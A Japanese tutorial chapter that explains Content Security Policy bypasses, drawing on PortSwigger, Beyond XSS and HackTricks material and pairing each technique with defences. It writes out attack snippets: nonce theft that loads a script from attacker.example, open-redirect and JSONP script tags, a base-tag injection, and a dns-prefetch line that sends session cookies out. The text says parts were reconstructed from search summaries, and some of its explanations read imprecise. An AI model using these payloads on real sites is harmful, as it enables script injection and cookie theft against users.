PortSwiggerの研究チームは、この「nonceベースCSPはallowlist型より安全」という通説を検証する過程で、**自社サイトportswigger.net自身**が実際にnonceベースCSPをバイパスされていたことを発見した。これは2023年12月9日にセキュリティ研究者Johan Carlsson（joaxcar）からHackerOne経由で報告された脆弱性（HackerOne報告 #2279346）で、2024年2月に詳細なwriteupが公開されている。

#### `strict-dynamic`が生む伝播的信頼という仕組み

上記のポリシー例にある`'strict-dynamic'`キーワードが本質的に重要である。これは「**正しいnonceを持つ`<script>`が、実行中に動的に生成・挿入した別の`<script>`要素は、たとえその新しい要素にnonceが付いていなくても信頼して実行してよい**」という、CSP仕様上の“信頼の伝播”ルールである（ホスト許可リストを無効化し、その代わりにこの伝播ルールを使う設計）。

これは実務上非常に重要な意味を持つ。**一度でも正規のnonceを持つスクリプトの実行コンテキストを乗っ取れれば（あるいは、有効なnonce値そのものを盗み出せれば）、その後は好きなだけスクリプトタグを動的に生成してDOMに追加でき、`strict-dynamic`のもとではnonceチェックなしに実行される**。つまりnonceベースCSPの安全性は、実質的に「有効なnonce値が外部から一切読み取れないこと」に懸念点が一極集中する。

#### nonce漏洩の経路：DOMプロパティとしてのnonce

ブラウザの仕様では、HTMLソース上の`nonce`属性値は、ページ描画後にセキュリティ上の配慮から**HTML属性としては`getAttribute("nonce")`で読めなくなる（空文字を返す）**ようマスクされる（いわゆるnonce hiding）。しかし同じ値は**DOMのJavaScriptプロパティ`element.nonce`としては引き続き読み取り可能**という非対称な設計になっている。

```js
document.querySelector('script').nonce // 正しいnonce値が取得できてしまう
document.querySelector('script').getAttribute('nonce') // "" (マスクされる)
```
> なぜ動くか: nonce hidingはあくまで「攻撃者がHTMLソースやDOMのシリアライズ結果（`outerHTML`など）を盗み見て値を持ち出す」経路を塞ぐための対策であり、ページ上で**既に実行できているJavaScriptコード**が`.nonce`プロパティに直接アクセスすることまでは防げない。攻撃者がすでに何らかの形でJavaScript実行の糸口（script gadget等）を得ていれば、この一行だけで有効なnonceを取得できる。

PortSwiggerの実例では、この「`.nonce`プロパティ経由でのnonce取得」を、**AngularJSのエラーハンドリング機構を悪用するscript gadget**（4-L-1で解説したものと同種の手法）と組み合わせていた。要点は次の通りである。

1. 攻撃者はサイト内の何らかの箇所にHTMLインジェクション（`<script>`タグを直接使わない、AngularJSに解釈される属性つきマークアップの注入）を成立させる。
2. その注入されたマークアップがAngularJSのエラーハンドラ経由のgadgetとして機能し、ページ内で**任意のJavaScript式**を評価できる状態になる。
3. その評価式の中で`document.querySelector('[nonce]').nonce`のようなセレクタを使い、ページ上に存在する正規スクリプトタグの有効なnonce値を取得する。
4. 取得したnonce値を使って、攻撃者が新しい`<script src="https://attacker.example/payload.js" nonce="盗んだ値">`要素を動的に生成しDOMに追加する。
5. `strict-dynamic`が有効なため、この新しい要素はホスト許可リストのチェックを受けず、**正しいnonceさえ持っていれば無条件で実行される**。

```js
// 概念を単純化した攻撃コード（実際のgadgetの起動方法はAngularJSの
// エラーハンドラ機構に依存するため詳細はwriteup原文を参照）
const stolenNonce = document.querySelector('[nonce]').nonce;
const s = document.createElement('script');
s.src = 'https://attacker.example/payload.js';
s.nonce = stolenNonce;
document.head.appendChild(s);
```
> なぜ動くか: ブラウザはCSPの`script-src`評価時に、新規挿入された`<script>`要素の`nonce`プロパティを見て、レスポンスヘッダで宣言された値と一致すれば実行を許可する。`strict-dynamic`下ではさらにホスト由来のチェックが免除されるため、正しいnonce値さえ再現できれば任意の外部ペイロードを読み込めてしまう。

#### 「動的解析」が果たした役割

PortSwigger Researchの記事タイトルが強調する“dynamic analysis（動的解析）”とは、静的なコードレビューやCSPヘッダの文面確認ではなく、**実際にブラウザでページをレンダリングし、DOM上で発生するイベントや関数呼び出しの結果を実行時に観測する検査手法**を指す。今回のケースでは、`document.querySelector`が条件に一致する要素が複数存在するとき常に**「文書順で最初の1要素」だけを返す**という、ごく基本的でありふれたDOM APIの仕様が、思わぬ形で「攻撃者から見て予測可能な正規nonce値の取得口」になっているという、静的な設定確認だけでは気づきにくい類の欠陥を、実行時の挙動観測によって機械的に発見できた点がこの研究の主眼である。

#### 防御策

- `strict-dynamic`は非常に強力な代わりに、**nonceの機密性が100%失われた瞬間に防御全体が崩壊する**運用リスクを背負うことを理解した上で採用する。
- ページ内のどこであれ、**攻撃者が制御できるコンテキストからJavaScriptを1行でも実行できる状態（script gadgetを含む）を残さない**。nonceベースCSPは「XSSを実行させない」対策ではなく「XSSされても被害を限定する」多層防御の一部であり、他のXSS対策（サニタイズ、Trusted Types等）を代替しない。
- 使用中のフロントエンドフレームワーク（AngularJS、Vue.js等）が持つエラーハンドラや属性解釈系のscript gadgetの有無を、既知の一覧（例：Google `security-research-pocs`のbypasses.md）と照合して点検する。
- 自動化された動的スキャン（実ブラウザでのレンダリングとDOM挙動観測）を、CSPヘッダの静的検証に加えて定期的に実施する。

> 出典: Hunting nonce-based CSP bypasses with dynamic analysis — https://portswigger.net/research/hunting-nonce-based-csp-bypasses-with-dynamic-analysis
（本記事の原典サイトはこの実行環境のプロキシでアクセスがブロックされたため、WebSearchで得られた要約に加え、同一の脆弱性について報告者本人が公開した詳細writeup「CSP bypass on PortSwigger.net using Google script resources」（Johan Carlsson／joaxcar.com, 2024年2月19日）、および対応するHackerOne公開報告 #2279346（2023年12月9日報告）の情報を踏まえて構成した。）

### まとめ：2つの実例に共通する原理

Truesecの事例とPortSwiggerの事例は、表面的には「script gadget」と「nonce漏洩」という別々の技術に見えるが、**CSPが“コードの出所”しか検証できず“実行内容の妥当性”は検証しないという同一の限界**に根ざしている点で本質的に同じ構造を持つ。CSPを設計・運用する際は、「許可リストに載っているコードは安全」と考えるのではなく、「許可リストに載っているコードが攻撃者にとっての踏み台（gadget）になりうるか」「信頼の伝播（`strict-dynamic`やnonceの露出経路）がどこまで及ぶか」を常に併せて検証する必要がある。

---

## CSPバイパス総まとめ（joaxcar / Beyond XSS / HackTricks）

CSP（Content Security Policy、コンテンツセキュリティポリシー）は「ブラウザ側で強制されるホワイトリスト型の実行制御機構」で、XSS（クロスサイトスクリプティング）が成立した後の**最後の防波堤**として機能する。素朴な反射型XSSを理解した読者が次に踏み込むべきなのが、この防波堤をどう突破するか、あるいはそもそも突破しなくても情報を盗めてしまうケースがあるという事実である。本節では実際のバグバウンティ報告（joaxcar）、体系的なチートシート的教材（Beyond XSS）、実務リファレンス（HackTricks）の3つの視点からCSPバイパスを整理する。

まず前提知識を短く確認する。CSPは `Content-Security-Policy` レスポンスヘッダ（または `<meta http-equiv="Content-Security-Policy">`）で配信され、`script-src`, `default-src`, `object-src`, `base-uri`, `form-action` などのディレクティブごとに「どこから」「どうやって」リソースを読み込んでよいかを宣言する。ブラウザはHTMLパーサがDOMを構築する過程で、スクリプトタグ等のsink（入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`、ここでは「スクリプトとして実行される場所」全般を指す）に到達するたびに、そのリソースの取得元URLやインラインかどうかをCSPのソースリストと照合し、一致しなければブロックする。**CSPバイパスとは、この照合ロジックの「抜け」や「解釈のズレ」を突いて、ポリシーが許可しているはずのない挙動を実行させる技術群**である。バイパスの多くは「攻撃コード自体の巧妙さ」ではなく、「許可リストに載っている“信頼済み”ドメインの中に、攻撃者が乗っ取れる機能（JSONPエンドポイント、AngularJS、オープンリダイレクトなど）が存在する」という運用上の見落としを突く点に本質がある。

---

### 1. joaxcar: PortSwigger.net における Google スクリプトリソースを使った CSP バイパス

> ⚠️ **未取得の資料**: 「CSP bypass on PortSwigger.net using Google script resources」（joaxcar, 2024-02-19）は自動取得できませんでした（理由: 環境のegressプロキシにより `joaxcar.com` へのアクセスがブロックされたため。GitHub上のミラーも存在せず、代替としてWeb検索を実施し、HackerOne上の開示情報および関連ブログの要約から概要を再構成した）。詳細は必ず以下のURLからユーザーご自身でご覧ください: https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/

（以下は未取得資料の補足として、検索で得られた公開情報＋一般知識に基づく解説です）

**概要（2024年2月19日公開、報告者 Johan Carlsson / joaxcar、HackerOne経由でPortSwiggerに報告、報奨金1,500ドル）**

PortSwigger.net が配信していたCSPの `script-src` ディレクティブには、Google Tag Manager や Google Analytics 等を動かすために `https://www.google.com` や `https://www.googletagmanager.com` のような「Googleが管理する巨大な共有ドメイン」が許可元として含まれていた。ここでの根本原因は次の**プリンシパルの誤り**である。

- CSPの `script-src https://www.google.com` という記述は、「そのオリジンから配信されるあらゆるスクリプトファイル」を無条件に信頼することを意味する。
- しかし `www.google.com` のような巨大ドメインは、検索・ウィジェット・実験的機能など無数のサブパスでJavaScriptを配信しており、その中には**任意のコードを実行できる「スクリプトガジェット」**（本来は無害な目的で書かれているが、外部から渡せるパラメータや埋め込みHTML経由で任意のJS実行に転用できるライブラリ・コード片）が紛れ込んでいる。
- 具体的にはAngularJSのような、DOM上の属性（`ng-app`、`ng-csp` など）をテンプレートとして評価するフレームワークがGoogleドメインの許可対象パス上でホストされているケースがあり、攻撃者はXSSで注入したHTML（`<div ng-app>{{constructor.constructor('alert(1)')()}}</div>` のようなAngular式）と、CSPで許可済みのGoogleドメインから読み込んだAngularJS本体を組み合わせることで、CSPが `script-src` を制限していても最終的に任意JavaScriptを実行できてしまう。

```html
<!-- CSPが https://www.google.com/... 配下のAngularJSを許可している場合の典型例 -->
<script src="https://www.google.com/.../angular.js"></script>
<div ng-app ng-csp>
  {{constructor.constructor('alert(document.domain)')()}}
</div>
```
これが動く理由は、**CSPはスクリプトの「取得元（どこから来たか）」しか検証せず、「そのスクリプトが実行時にどんなAPI・機能を提供するか」は一切見ていない**からである。AngularJSはCSP的には「許可されたドメインから来た正規のスクリプト」でしかないが、実行時にはDOM上のテンプレート構文を評価してJavaScriptとして実行するインタプリタとして振る舞う。攻撃者はこの「許可されたインタプリタ」に自分の注入したマークアップを食わせることで、事実上のコード実行を得る。

PortSwigger側のCSPには他にも懸念があり、修正後もjoaxcarは追加で「フォームハイジャック（form hijacking）」によるCSP回避を報告している。これは `form-action` ディレクティブが十分に制限されていない場合、攻撃者がXSSで `<form action="https://attacker.example">` を注入し、既存の入力フィールド（ログインフォームなど）の送信先を書き換えることで、CSPの `script-src` を一切破らずに認証情報や機密情報を外部に持ち出す手法である（詳細はPortSwigger Researchの "Using form hijacking to bypass CSP" 参照）。

**教訓（原理レベル）**: CSPのホワイトリストは「ドメインの信頼」を「そのドメイン上の全パスの安全性」に暗黙に拡大してしまう。巨大なCDNやアナリティクスドメイン（Google, Cloudflare, jsDelivr等）を安易に許可すると、そのドメイン上でホストされている無数のライブラリの中から「スクリプトガジェット」を探し出されるだけでバイパスされる。対策は、許可ドメインを最小化し、可能な限り `strict-dynamic` + nonce/hash方式（後述）へ移行することである。

---

### 2. Beyond XSS: 一般的なCSPバイパス手法

> ⚠️ **未取得の資料（部分的）**: 「Bypassing Your Defenses: Common CSP Bypasses」（Beyond XSS, aszx87410, Chapter 2）は自動取得できませんでした（理由: `aszx87410.github.io` が環境のegressプロキシでブロックされ、GitHubリポジトリ `aszx87410/beyond-xss` 内の該当Markdownファイルも直接のパス推測では404となり取得できなかったため。Web検索による断片的な要約のみ確認できている）。正確な全文は以下のURLからユーザーご自身でご覧ください: https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/

（以下は検索で得られた要約情報＋一般知識に基づく体系的な補足解説です）

Beyond XSSのCSPバイパス章は、CSPを「XSSに対する第二の防衛線」と位置づけた上で、代表的なバイパスパターンを類型化して紹介している。確認できた要点と、それを補う一般的な技術解説は以下の通り。

**(a) オープンリダイレクト + JSONPの組み合わせ**

CSPの `script-src` に許可されたドメイン（例: `accounts.google.com`）に**オープンリダイレクト**（任意の外部URLへ転送してしまう脆弱な機能、例: `/logout?continue=<任意URL>`）が存在する場合、攻撃者は次のようなURLを `<script src="...">` に指定できる。

```html
<script src="https://accounts.google.com/logout?continue=https://attacker.example/evil.js"></script>
```

これが動く理由は、**CSPのソース照合はリクエスト送信前のURL（＝スクリプトタグに書かれたURL）のホスト名だけを見て許可判定を行い、その後サーバ側やHTTP 30x応答で発生するリダイレクト先までは検証しないブラウザの実装が存在する**ためである（仕様上はCSP3でリダイレクト後のURLも再検証すべきとされているが、実装や設定によっては初期リクエストのホストだけで通過してしまうケースが報告されてきた）。結果として、許可ドメインのオープンリダイレクトを踏み台に、任意ドメインからのスクリプト読み込みへとすり替えられる。

さらにこれをJSONPエンドポイント（`?callback=xxx` のようなパラメータでJavaScriptの関数呼び出し形式のレスポンスを返すAPI）と組み合わせると、リダイレクトすら不要な場合がある。許可済みドメインが `https://trusted.example/api/data?callback=alert(document.cookie)//` のようなJSONPを提供していれば、そのレスポンスは `alert(document.cookie)//({...})` という**そのまま実行可能なJavaScript文**になる。CSPは「trusted.exampleから来たスクリプトである」ことしか検証しないため、中身が攻撃者の指定した任意コードであっても素通りする。

```html
<script src="https://trusted.example/jsonp?callback=alert(document.domain)//"></script>
```

**(b) `base-uri` 未設定を突いた `<base>` タグインジェクション（Dangling Markup的手法）**

CSPで `base-uri` ディレクティブが明示されていない場合、攻撃者がHTMLインジェクション（完全なXSSでなくてもタグ挿入ができれば足りる）で以下を注入できる。

```html
<base href="https://attacker.example/">
```

`<base>` は文書内のすべての相対URL（`<script src="app.js">` のような相対パス指定）の基準を書き換える。これにより、ページが本来 `/app.js`（＝自サイト）を読み込むつもりで書いていたコードが、実際には `https://attacker.example/app.js` を読み込んでしまう。これは**HTMLパーサが `<base>` をスクリプト実行前の早い段階（head解析時）で処理し、以降のURL解決に影響を与える**という、DOM構築の順序に起因する挙動である。CSPの `script-src` が正規オリジンを許可していても、その「正規オリジン」の相対パス解決先そのものを攻撃者が乗っ取ってしまう点がポイントで、`base-uri 'self'`（または `'none'`）を明示しない限り防げない。

**(c) Report-Onlyモードの誤運用**

`Content-Security-Policy-Report-Only` ヘッダは、違反を検知してレポートを送信するだけで、**実際のブロックを一切行わない**。開発中の設定確認用ヘッダを本番の `Content-Security-Policy`（強制モード）と混同・併用ミスすると、見た目上は「CSPが設定されている」のに実際には何も制限されておらず、通常のXSSペイロードがそのまま素通りする。これはCSPバイパスというより「CSPが実質的に存在しない」状態だが、監査で見落とされやすい典型的な設定ミスとして紹介されている。

> 出典: Bypassing Your Defenses: Common CSP Bypasses — Beyond XSS — https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/

---

### 3. HackTricks: CSPバイパス総覧

HackTricksの本ページは取得に成功した。CSPの仕組みの整理から実践的なバイパス手法まで非常に広範に扱われており、以下に主要トピックを整理する。

**CSPの基本**

CSPは `script-src`（JS読み込み元）、`default-src`（未指定ディレクティブへのフォールバック）、`connect-src`（`fetch`/`XMLHttpRequest`/WebSocket接続先）、`frame-src`（iframe読み込み元）、`form-action`（フォーム送信先）、`object-src`（`<object>`/`<embed>`/`<applet>`）、`base-uri`（`<base>`要素で指定可能なURL）などのディレクティブで構成される。`Content-Security-Policy-Report-Only` は強制せずレポートのみを行う点は前述の通り。

**脆弱なポリシーごとのバイパス手法**

- **`'unsafe-inline'` が有効な場合**: そもそもインラインスクリプトの実行が許可されているため、通常のHTMLインジェクションから直接 `<script>alert(1)</script>` を注入すればよく、CSPは実質無力化されている。
- **`'unsafe-eval'` が有効な場合**: `eval()`, `new Function()`, `setTimeout("文字列", …)` などの「文字列をコードとして評価する」API群がブロックされない。`data:` スキームと組み合わせ、`<script src="data:text/javascript;base64,...">` のようにBase64エンコードしたJSをdata URIとして読み込ませる手口も紹介される。これは `unsafe-eval` 自体はdata URI経由の `<script src>` の可否に直接関係しないディレクティブだが、`script-src` の値に `data:` が許可指定として含まれているような構成ミスと合わせて悪用されるケースを指す。
- **ワイルドカード（`*`）指定**: `script-src *` のように無制限指定、あるいは `https:` のようなスキームだけの指定は、攻撃者が完全に自由なドメインからスクリプトを読み込めることを意味し、CSPとして機能していない。
- **`strict-dynamic` の誤解**: `strict-dynamic` は「nonceまたはhashで許可された信頼済みスクリプトが、動的に（`document.createElement('script')`等で）生成した新しいスクリプトタグは、そのURLに関わらず自動的に信頼する」という委譲の仕組みである。これは元々「ドメインホワイトリスト方式の弱点（前述のjoaxcarの例のようなガジェット問題）を解消するため」に導入された仕様だが、逆に**信頼済みスクリプト自身にXSS類似の脆弱性（例えばそのスクリプトが外部入力をもとに新しいscriptタグを組み立ててしまうコード）があれば、その信頼を丸ごと悪用される**という新たなリスクを生む。
- **ファイルアップロード + `'self'`**: アップロードされたファイルが自サイト（`'self'`）配下に置かれ、かつサーバがMIMEタイプやURLパスの拡張子判定を誤る場合、`picture.png.js` のような二重拡張子ファイルをアップロードし、`<script src="/uploads/picture.png.js">` として読み込ませることで、`'self'` 制限下でもJS実行に成功する。
- **サードパーティエンドポイント悪用**: 前述のAngularJS + `ng-app`/`ng-csp` の式評価パターンに加え、Google reCAPTCHAのスクリプト（`recaptcha/about/js/main.min.js`）が提供するAngular的な `ng-on-error` ディレクティブを介した `alert()` 実行例や、Google検索サジェストのJSONPエンドポイント（`google.com/complete/search?...&callback=alert#1`）を `<script src>` に指定してコード実行させる例が挙げられている。いずれも「許可ドメイン上に存在する、開発者が意図しない機能拡張点（テンプレートエンジンやコールバックパラメータ）」を突く点で共通している。
- **Relative Path Overwrite (RPO)**: `<script src="https://example.com/scripts/react/..%2fangular%2fangular.js">` のように、URLエンコードしたパストラバーサル（`%2f` は `/` のURLエンコード表現）をスクリプトのパスに混ぜる。CSPの照合はオリジン単位で行われ、パスの正規化前後の差異までは厳密にチェックされないブラウザ実装があるため、`../` に相当する記述で許可オリジン配下の別のスクリプト（本来読み込むはずのなかった脆弱なライブラリ）にすり替えられる。
- **`base-uri` 欠如の悪用**: Beyond XSSの節で述べた `<base href="https://attacker.example/">` インジェクションと同様の手法。
- **nonce再利用/漏洩**: 同一ページ内の別の場所（例えば別のiframe経由でDOMアクセスできる箇所）に置かれた正規の `nonce` 属性値を読み取り、それを攻撃者が新しく生成する `<script>` タグの `nonce` にコピーして貼り付けることで、CSPのnonce検証（「このリクエストに使われたnonceが、レスポンスヘッダで指定されたnonceと一致するか」）をすり抜ける。これはnonceの値そのものは正しいので検証上は「合法」なスクリプトとして扱われてしまうことに起因する。
- **許可元でのリダイレクト**: CSPでパスまで絞った許可（例: `script-src https://www.google.com/a/b/c/d`）をしていても、そのURLが302リダイレクトで別のパス・別のリソースへ転送する場合、多くのブラウザ実装は「最初にマッチしたオリジンさえ許可条件を満たせばよい」とみなし、リダイレクト先のパスまでは再検証しない（前述のBeyond XSSのオープンリダイレクト事例と同根の問題）。
- **Service Worker経由の `importScripts` 悪用**: Service Worker内で使われる `importScripts()` はCSPの `script-src` 制限の対象外として扱われる実装上のギャップが存在し、Service Workerを登録できる状況（`self` オリジンへの書き込み権限がある等）ではCSPをすり抜けてコードを読み込める。
- **ポリシー注入によるCSP破壊**: HTTPヘッダインジェクションなどでCSPヘッダ自体に追記できる状況では、ブラウザ実装依存の挙動を突いて既存ポリシーを無力化できる。例としてChromeでは `script-src-elem *; script-src-attr *` のような、より詳細度の高い（fetch directiveの中でも要素・属性別に分かれた）ディレクティブを追加注入すると、それが `script-src` の指定を実質的に上書き・無効化してしまう仕様上の優先順位（`script-src-elem`/`script-src-attr` は `script-src` よりも詳細度が高く優先される）が悪用される。Edgeでは `;_` のような無効なトークンを挿入すると、パーサの誤動作でポリシー全体が破棄されるという実装バグ的な事例も紹介されている。

**CSPが有効なままでの情報窃取（バイパスせずに漏洩させる手法）**

XSSは成立したがCSPで外部への `fetch`/`script`/`img` 読み込みが厳密にブロックされている場合でも、CSPのディレクティブがカバーしていない経路を使えば情報を持ち出せる。

- **DNSプリフェッチ悪用**: `<link rel="dns-prefetch" href="//<盗みたいデータ>.attacker.example">` を注入すると、ブラウザは表示パフォーマンス向上のためにこのホスト名を事前にDNS解決しようとする。DNSクエリの送信自体はCSPの `connect-src`/`img-src` 等のフェッチ系ディレクティブの制御対象外であることが多く、機密情報（セッションIDの断片など）をサブドメインに埋め込んでDNSクエリとして外部（攻撃者が権威DNSサーバを持つドメイン）に送信できる。
```javascript
var sessionid = document.cookie.split("=")[1] + "."
document.body.innerHTML += '<link rel="dns-prefetch" href="//' + sessionid + 'attacker.example">'
```
これが機能する理由は、**CSPのフェッチ系ディレクティブはHTTP/HTTPSやWebSocketなど「アプリケーション層のリクエスト」を制御対象として設計されており、ブラウザが内部的に行うDNS解決という「名前解決レイヤーの動作」までは制御範囲に含まれていない**ためである。
- **WebRTCのSTUN/ICE経由の漏洩**: `RTCPeerConnection` でSTUNサーバへの接続を試みる際に発生する通信も、CSPの `connect-src` の対象外となる実装・バージョンが存在し、STUNサーバのホスト名部分にデータを埋め込んで外部に送信する手口が使われてきた（ブラウザベンダ側でも `connect-src` へのWebRTC組み込みが順次進められているため、対象ブラウザ・バージョンによって有効性が異なる点に注意）。
- **`document.location` による直接遷移**: CSPは「リソースの読み込み」を制御するものであり、`navigate-to` ディレクティブ（実装が限定的）を設定していない限り、`document.location = "https://attacker.example/?" + secret` のようなページ遷移そのものはブロックされないブラウザが多い。これはCSPの設計思想が「埋め込みリソースの出所検証」であって「ユーザーの能動的なナビゲーション」とは別物として扱われてきた歴史的経緯による。

**PHPの実装上の欠陥を突いたCSPヘッダそのものの無効化**

サーバサイドの実装（特にPHP）に起因する、CSPヘッダ自体を消し飛ばす手法も紹介されている。

- 1001個以上のGETパラメータを送信すると、PHPが警告（notice/warning）を出力し、それがレスポンスボディに先行して出力されてしまう場合、`header()` 関数（レスポンスヘッダを設定するPHP関数）呼び出し前に本文が出力されたことになり「headers already sent」エラーとなってヘッダ設定自体が失敗する。
- `max_input_vars`（PHPのデフォルトは1000）を超える数の入力変数を送ると同様の警告が発生し、CSPヘッダの送信に失敗する。
```
curl "http://example.com/?xss=<svg/onload=alert(1)>&A=1&A=2&...(1000個以上)"
```
- レスポンスバッファ（PHPのデフォルトのoutput_buffering相当、目安として4096バイト程度）を大量の警告メッセージで埋め尽くすと、CSPヘッダがレスポンスバッファからあふれて実際に送出されるレスポンスに含まれなくなる。

これらはいずれも「アプリケーションのエラーハンドリングの不備によって、セキュリティヘッダの送信自体が失われる」という、CSPロジック外の攻撃面である点に注意したい。

**検証・防御のためのツールとベストプラクティス**

- チェックツール: Google製の `CSP Evaluator`（csp-evaluator.withgoogle.com）、`cspvalidator.org`、ポリシー自動生成の `csper.io` などが実務でよく使われる。
- 防御の骨子は次の通りである。
  1. `'unsafe-inline'` と `'unsafe-eval'` を避ける。
  2. ドメインホワイトリスト方式ではなく、`nonce`（レスポンスごとに生成するワンタイムのランダムトークン）または `hash`（許可するインラインスクリプトのSHA値）と `'strict-dynamic'` を組み合わせる方式に移行する。これによりjoaxcarの事例のような「許可ドメイン上のガジェット探索」を無効化できる。
  3. `object-src 'none'` で古いプラグイン（Flash等）ベクタを遮断する。
  4. `base-uri 'self'`（または `'none'`）を必ず明示し、`<base>` インジェクションを封じる。
  5. `form-action 'self'` を設定し、フォームハイジャックを防ぐ。
  6. サードパーティドメインを許可リストに入れる際は、そのドメイン上に存在する全パスの安全性まで保証できないことを前提に、可能な限り許可対象を細く・具体的なパスまで絞り込む（ただし前述のリダイレクト・RPOのようにパス指定も万能ではない点に留意）。
  7. アップロードファイルのMIMEタイプ・拡張子検証を厳格化し、`'self'` 配下にユーザ制御コンテンツを置く場合は別オリジン（サブドメイン分離等）に退避する。

> 出典: Content Security Policy (CSP) Bypass — HackTricks — https://book.hacktricks.wiki/en/pentesting-web/content-security-policy-csp-bypass/index.html

---

### まとめ: 3資料を貫く共通原理

joaxcar、Beyond XSS、HackTricksの3資料に共通するのは、**CSPバイパスの大半が「CSPのソース照合ロジックが検証しているもの（オリジン・パス・nonce・hash）」と「実際に安全性を左右するもの（そのリソースが実行時に何をするか、リダイレクトやエンコーディングでURLがどう解決されるか）」との間にあるギャップを突いている**という点である。ドメインホワイトリスト方式は運用が直感的である反面、許可ドメイン上の未知のガジェットやオープンリダイレクト・JSONPエンドポイントに脆弱であり、これが `nonce`/`hash` + `strict-dynamic` という現代的な設計への移行が推奨される最大の理由になっている。読者は個々のペイロードを暗記するのではなく、「このCSP設定は何を検証していて、何を検証していないのか」を常に問い直す視点を持つことが、CSPバイパスを体系的に理解する近道である。

---

（前章: [第3章 DOMベースXSS](./03-dom-xss.md)　｜　次章: [第5章 フレームワーク固有のXSS](./05-frameworks.md)　｜　[目次](./README.md)）
